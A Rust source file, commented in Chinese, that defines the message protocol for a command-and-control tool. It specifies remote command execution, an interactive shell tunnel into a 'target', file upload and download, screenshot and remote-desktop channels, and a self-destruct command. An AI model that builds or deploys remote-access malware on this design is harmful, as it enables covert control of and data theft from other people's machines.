//! # C2 通信协议
//!
//! 定义了 C/S 之间传递的消息帧格式。
//! 所有消息使用 JSON（serde）序列化，数据块（Bulk）部分则为裸字节。

use serde::{Deserialize, Serialize};

/// C2 通信消息。
///
/// 根据不同用途分为三类通道：
///
/// | 消息变体 | 通道 | 说明 |
/// |---|---|---|
/// | `Control` | 控制通道 | 长连接，关键操控指令 |
/// | `Shell` | Shell 隧道 | 交互式 shell (cmd/pwsh/bash/zsh) |
/// | `Bulk` | 大吞吐通道 | 文件传输、截屏、远程桌面数据 |
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Message {
    // ── 系统层 ──────────────────────────────────────────────────
    /// 客户端上报系统信息
    SystemInfo(crate::c2core::SystemInfo),
    /// 心跳
    Ping,
    /// 心跳回复
    Pong,

    // ── 控制通道 (Control) ─────────────────────────────────────
    /// 服务端 -> 客户端：执行命令
    Control(ControlMsg),
    /// 客户端 -> 服务端：命令执行结果
    ControlResult { id: u64, output: String },

    // ── Shell 隧道 (Tunnel) ────────────────────────────────────
    /// 在目标上打开一个交互式 shell
    ShellOpen { shell_type: ShellType },
    /// Shell 输入（服务端 -> 客户端，注入按键/命令）
    ShellInput { data: Vec<u8> },
    /// Shell 输出（客户端 -> 服务端，回显）
    ShellOutput { data: Vec<u8> },
    /// 关闭 shell
    ShellClose,

    // ── 大吞吐通道 (Bulk) ──────────────────────────────────────
    /// 开始传输一个文件/数据流
    BulkStart { name: String, total_size: u64 },
    /// 数据块
    BulkChunk { offset: u64, data: Vec<u8> },
    /// 传输完成
    BulkEnd { checksum: Option<String> },
    /// 传输取消
    BulkCancel { reason: String },
}

/// 控制指令
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ControlMsg {
    /// 执行系统命令并返回输出
    Exec { command: String },
    /// 上传文件
    Upload { path: String },
    /// 下载文件
    Download { path: String },
    /// 自我删除
    SelfDestruct,
}

/// Shell 类型
///
/// 客户端探测到哪些可用，上报给服务端；
/// 服务端选一个，下发 `ShellOpen` 指令。
#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub enum ShellType {
    /// Windows CMD
    #[serde(rename = "cmd")]
    Cmd,
    /// PowerShell 5.1 (Windows 内置)
    #[serde(rename = "powershell51")]
    PowerShell51,
    /// PowerShell Core 7+ (跨平台 pwsh)
    #[serde(rename = "powershell7")]
    PowerShell7,
    /// NuShell (现代 Rust Shell)
    #[serde(rename = "nu")]
    Nu,
    /// Bourne Shell
    #[serde(rename = "sh")]
    Sh,
    /// Bourne Again Shell
    #[serde(rename = "bash")]
    Bash,
    /// Z Shell
    #[serde(rename = "zsh")]
    Zsh,
    /// Git Bash (Windows)
    #[serde(rename = "gitbash")]
    GitBash,
}

/// 将 `Message` 序列化为 JSON 字节（用于网络传输）。
pub fn encode(msg: &Message) -> Result<Vec<u8>, serde_json::Error> {
    serde_json::to_vec(msg)
}

/// 从 JSON 字节反序列化为 `Message`。
pub fn decode(data: &[u8]) -> Result<Message, serde_json::Error> {
    serde_json::from_slice(data)
}
